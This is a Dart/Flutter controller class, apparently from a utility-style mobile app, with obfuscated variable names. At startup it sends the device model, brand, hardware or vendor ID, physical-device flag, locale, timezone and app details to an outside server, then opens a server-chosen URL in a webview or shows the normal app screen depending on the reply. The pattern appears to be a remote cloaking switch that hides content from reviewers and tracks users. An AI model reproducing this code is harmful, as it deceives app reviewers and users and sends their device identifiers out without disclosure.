import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:internet_connection_checker/internet_connection_checker.dart';



class LightClearLogic extends GetxController {

  var kmcoiva = RxBool(false);
  var tvgysizfn = RxBool(true);
  var nmujsl = RxString("");
  var lorena = RxBool(false);
  var emard = RxBool(true);
  final nxwzbkhet = Dio();


  InAppWebViewController? webViewController;

  dynamic oenuwtq(){
    final tqecpv = InternetConnectionChecker.instance;
    final wjramp = tqecpv.onStatusChange.skip(1).listen(
          (InternetConnectionStatus lwuhmzeq) {
        if (lwuhmzeq == InternetConnectionStatus.connected) {
          lrtkdx();
        } else {
          Get.toNamed('/light_refresh')?.then((_){
            lrtkdx();
          });
        }
      },
    );
    return wjramp;
  }

  Future<bool> udoickx() async {
    var noujagk = await InternetConnectionChecker.instance.hasConnection;
    if(!noujagk){
      Get.toNamed('/light_refresh')?.then((_){
        lrtkdx();
      });
    }
    return noujagk;
  }

  @override
  void onInit() {
    super.onInit();
    oenuwtq();
    lrtkdx();
  }


  Future<void> lrtkdx() async {

    var vjixcolqk = await udoickx();
    if(!vjixcolqk){
      return;
    }

    lorena.value = true;
    emard.value = true;
    tvgysizfn.value = false;

    nxwzbkhet.post("https://let.depdown.com/A8LG8A",data: await iqyumkz()).then((value) {
      var sktxchr = value.data["sktxchr"] as String;
      var hksd = value.data["hksd"] as bool;
      if (hksd) {
        nmujsl.value = sktxchr;
        joe();
      } else {
        dibbert();
      }
    }).catchError((e) {
      tvgysizfn.value = true;
      emard.value = true;
      lorena.value = false;
    });
  }

  Future<Map<String, dynamic>> iqyumkz() async {
    final DeviceInfoPlugin szlgjohf = DeviceInfoPlugin();
    PackageInfo clemkhz_xsmhb = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var velrif = Platform.localeName;
    var KMXli = currentTimeZone;

    var yDgbTMI = clemkhz_xsmhb.packageName;
    var jlOwGY = clemkhz_xsmhb.version;
    var LirMYw = clemkhz_xsmhb.buildNumber;

    var rvclXfNV = clemkhz_xsmhb.appName;
    var XDTJZKws = "";
    var ShyxYWQ  = "";
    var zTPjaGe = "";
    var lottieRuecker = "";
    var tryciaSatterfield = "";
    var ashlynnDooley = "";


    var wUWNM = "";
    var GHVtT = false;

    if (GetPlatform.isAndroid) {
      wUWNM = "android";
      var ukcnrg = await szlgjohf.androidInfo;

      zTPjaGe = ukcnrg.brand;

      XDTJZKws  = ukcnrg.model;
      ShyxYWQ = ukcnrg.id;

      GHVtT = ukcnrg.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      wUWNM = "ios";
      var sujfnktvd = await szlgjohf.iosInfo;
      zTPjaGe = sujfnktvd.name;
      XDTJZKws = sujfnktvd.model;

      ShyxYWQ = sujfnktvd.identifierForVendor ?? "";
      GHVtT  = sujfnktvd.isPhysicalDevice;
    }
    var res = {
      "tryciaSatterfield" : tryciaSatterfield,
      "rvclXfNV": rvclXfNV,
      "LirMYw": LirMYw,
      "yDgbTMI": yDgbTMI,
      "XDTJZKws": XDTJZKws,
      "KMXli": KMXli,
      "zTPjaGe": zTPjaGe,
      "ShyxYWQ": ShyxYWQ,
      "velrif": velrif,
      "GHVtT": GHVtT,
      "lottieRuecker" : lottieRuecker,
      "jlOwGY": jlOwGY,
      "ashlynnDooley" : ashlynnDooley,
      "wUWNM": wUWNM,
    };
    return res;
  }

  Future<void> dibbert() async {
    Get.offNamed("/light_tab");
  }

  Future<void> joe() async {
    Get.offNamed("/light_re");
  }

  @override
  void dispose() {
    oenuwtq().cancel();
    super.dispose();
  }

}
